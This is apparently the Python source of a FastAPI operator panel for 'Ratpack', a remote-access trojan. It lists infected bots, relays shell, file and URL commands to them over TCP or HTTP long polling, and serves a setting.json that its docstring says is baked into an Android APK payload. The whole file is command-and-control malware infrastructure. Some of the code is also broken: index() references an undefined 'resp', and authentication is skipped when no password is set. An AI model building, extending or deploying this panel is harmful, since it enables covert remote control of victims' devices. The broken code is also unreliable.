"""
panel.py — the Ratpack web panel.

FastAPI application that serves:
  /                 bot list and live event feed
  /bot/<id>         per-bot console
  /setting.json     the configuration document for the Ratpack Compiler
  /login, /logout   session handling

The panel talks to the C2 over the control channel (localhost TCP), so the
panel and the bot-facing server can be started independently.
"""

import base64
import hmac
import json
import os
import socket
import time
from typing import Any, Dict, Optional

from fastapi import FastAPI, Form, HTTPException, Query, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, Response
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.concurrency import run_in_threadpool

from . import config as cfgmod
from .botclient import ControlClient
from .httpbot import HttpBotRegistry

HERE = os.path.dirname(os.path.abspath(__file__))
# The templates and static files live next to this module, inside the
# ratpack package.
TEMPLATES = os.path.join(HERE, "templates")
STATIC = os.path.join(HERE, "static")

app = FastAPI(title="Ratpack Panel", docs_url=None, redoc_url=None)
templates = Jinja2Templates(directory=TEMPLATES)

if os.path.isdir(STATIC):
    app.mount("/static", StaticFiles(directory=STATIC), name="static")

_client: Optional[ControlClient] = None

# Registry for bots that speak HTTP long polling. It shares the Bot objects
# with the TCP C2, so the panel does not care which transport a bot uses.
class _PanelServerBridge:
    """
    The single bot registry shared by every transport.

    The TCP C2 and the HTTP long-polling transport register their bots in
    the same registry, so the panel shows one uniform bot list no matter how
    a bot reached the server.

    The registry is created here and handed to the C2 by run.py, so the two
    processes do not each keep their own copy.
    """

    def __init__(self):
        from .bots import BotRegistry
        self.secret = ""
        self.registry = BotRegistry()
        self.events = self.registry.events
        self.c2 = None            # set by run.py

    def load(self):
        cfg = cfgmod.load()
        self.secret = cfg.get("secret", "")
        return self

    def make_http_bot(self, bot_id, info):
        from .bots import Bot
        return Bot(bot_id, None, ("http", info.get("host", "?")), info,
                   transport="http")


_panel_server = _PanelServerBridge().load()


def panel_server():
    """The bridge that owns the shared registry."""
    return _panel_server

_http_registry: Optional[HttpBotRegistry] = None


def get_http_registry() -> HttpBotRegistry:
    """The registry for HTTP-transport bots (shared with the C2)."""
    global _http_registry
    if _http_registry is None:
        _http_registry = HttpBotRegistry(_panel_server)
    return _http_registry


def client() -> ControlClient:
    global _client
    if _client is None:
        cfg = cfgmod.load()
        _client = ControlClient("127.0.0.1", int(cfg.get("c2", {}).get("port", 8777)) + 1)
    return _client


def control(req: dict, timeout: float = 30) -> dict:
    try:
        return client().call(req, timeout=timeout)
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}"}


def dispatch(bot_id: str, cmd: str, args: dict, timeout: float = 60) -> dict:
    """
    Runs a command on a bot, whichever transport that bot used.

    HTTP bots live in the shared registry and are reachable directly; TCP
    bots are reached through the control channel of the C2 process.
    """
    bot = _panel_server.registry.get(bot_id)
    if bot is not None and getattr(bot, "transport", "tcp") == "http":
        try:
            result = bot.request(cmd, timeout=timeout, **args)
            return {"ok": True, "result": result}
        except TimeoutError as e:
            return {"ok": False, "error": str(e)}
        except Exception as e:
            return {"ok": False, "error": f"{type(e).__name__}: {e}"}
    return control({"op": "cmd", "bot": bot_id, "cmd": cmd,
                    "args": args, "timeout": timeout}, timeout=timeout + 10)


# ---------------------------------------------------------------------------
# auth
# ---------------------------------------------------------------------------

def _hash(password: str) -> str:
    return base64.b64encode(
        hmac.new(b"ratpack", password.encode("utf-8"), "sha256").digest()
    ).decode()


def check_auth(request: Request) -> bool:
    cfg = cfgmod.load()
    web = cfg.get("web", {})
    expected_user = web.get("username", "admin")
    expected_pass = web.get("password", "")
    if not expected_pass:
        return True          # bot interface: no web credentials
    session = request.cookies.get("ratpack_session", "")
    return session == _hash(expected_user + ":" + expected_pass)


def require_auth(request: Request):
    if not check_auth(request):
        raise HTTPException(status_code=401, detail="authentication required")


# ---------------------------------------------------------------------------
# routes
# ---------------------------------------------------------------------------

@app.get("/login", response_class=HTMLResponse)
def login_form(request: Request):
    return templates.TemplateResponse(request, "login.html", {"error": None})


@app.post("/login")
def login(username: str = Form(...), password: str = Form(...)):
    cfg = cfgmod.load()
    web = cfg.get("web", {})
    if hmac.compare_digest(username, web.get("username", "admin")) and \
       hmac.compare_digest(password, web.get("password", "")):
        resp = RedirectResponse("/", status_code=302)
        resp.set_cookie("ratpack_session", _hash(username + ":" + password),
                        httponly=True, samesite="lax")
        return resp
    return templates.TemplateResponse(
        request, "login.html", {"error": "wrong credentials"}, status_code=401)


@app.get("/logout")
def logout():
    resp = RedirectResponse("/login", status_code=302)
    resp.delete_cookie("ratpack_session")
    return resp


@app.get("/setting.json")
def setting_json(request: Request):
    """
    The configuration document the Ratpack Compiler consumes.

    Downloaded by the operator and dropped into the compiler folder; the
    compiler bakes it into the APK as assets/setting.json and patches the
    payload's RatCfg with the same values.
    """
    require_auth(request)
    cfg = cfgmod.load()
    doc = cfgmod.build_setting_json(cfg)
    body = json.dumps(doc, indent=2, ensure_ascii=False)
    return Response(
        content=body,
        media_type="application/json",
        headers={
            "Content-Disposition": 'attachment; filename="setting.json"',
            "Cache-Control": "no-store",
        },
    )


@app.get("/", response_class=HTMLResponse)
def index(request: Request):
    require_auth(request)
    bots = _panel_server.registry.summary()
    events = []
    events = []
    return templates.TemplateResponse(request, "index.html", {
        "bots": bots,
        "events": events,
        "error": resp.get("error"),
        "config": cfgmod.load(),
    })


@app.get("/bot/{bot_id}", response_class=HTMLResponse)
def bot_page(request: Request, bot_id: str, cmd: str = Query(""), argument: str = Query("")):
    require_auth(request)
    bots = _panel_server.registry.summary()
    bot = next((b for b in bots if b["id"] == bot_id), None)

    output = ""
    if cmd and bot is not None:
        args: Dict[str, Any] = {}
        if argument:
            args["path"] = argument
            args["command"] = argument
            args["url"] = argument
        r = dispatch(bot_id, cmd, args, timeout=90)
        output = json.dumps(r, indent=2, ensure_ascii=False)

    bot = _panel_server.registry.get(bot_id)
    if bot is not None and getattr(bot, "transport", "tcp") == "http":
        with bot.lock:
            bot_events = list(bot.events)
    else:
        ev = control({"op": "bot_events", "bot": bot_id}, timeout=10)
        bot_events = ev.get("events", []) if ev.get("ok") else []

    return templates.TemplateResponse(request, "bot.html", {
        "bot": bot,
        "bots": bots,
        "output": output,
        "events": bot_events,
    })


@app.get("/api/bots")
def api_bots(request: Request):
    require_auth(request)
    return JSONResponse({"ok": True, "bots": _panel_server.registry.summary()})


@app.get("/api/command")
def api_command(request: Request, bot: str, cmd: str, argument: str = ""):
    require_auth(request)
    args: Dict[str, Any] = {}
    if argument:
        args["path"] = argument
        args["command"] = argument
        args["url"] = argument
    return JSONResponse(dispatch(bot, cmd, args, timeout=90))


# ---------------------------------------------------------------------------
# HTTP long-polling transport
#
# Used when the server cannot bind a raw TCP port (shared hosting). The bot
# polls for commands and posts frames back. The endpoints are unauthenticated
# at the transport level; every frame still carries the shared secret and is
# rejected when it does not match.
# ---------------------------------------------------------------------------

@app.post("/bot/register")
async def bot_register(request: Request):
    body = await request.json()
    bot, err = get_http_registry().register(body)
    if err:
        return JSONResponse({"ok": False, "error": err}, status_code=403)
    return {"ok": True, "id": bot.id}


@app.post("/bot/poll/{bot_id}")
async def bot_poll(bot_id: str, request: Request):
    body = {}
    try:
        body = await request.json()
    except Exception:
        pass
    timeout = float(body.get("timeout", 25))
    timeout = max(1.0, min(timeout, 55.0))
    frame = await run_in_threadpool(get_http_registry().poll, bot_id, timeout)
    if frame is None:
        # 204: nothing to do, the bot should poll again.
        return Response(status_code=204)
    return frame


@app.post("/bot/send/{bot_id}")
async def bot_send(bot_id: str, request: Request):
    body = await request.json()
    type_, payload = get_http_registry().json_to_frame(body)
    get_http_registry().send(bot_id, type_, payload)
    return {"ok": True}


@app.get("/healthz")
def healthz():
    cfg = cfgmod.load()
    return {"ok": True, "mode": cfg.get("mode"), "time": time.time()}


def main():
    import uvicorn
    cfg = cfgmod.load()
    web = cfg.get("web", {})
    host = web.get("host", "127.0.0.1")
    port = int(web.get("port", 8080))
    print(f"Ratpack Panel on http://{host}:{port}")
    uvicorn.run(app, host=host, port=port, log_level="info")


if __name__ == "__main__":
    main()
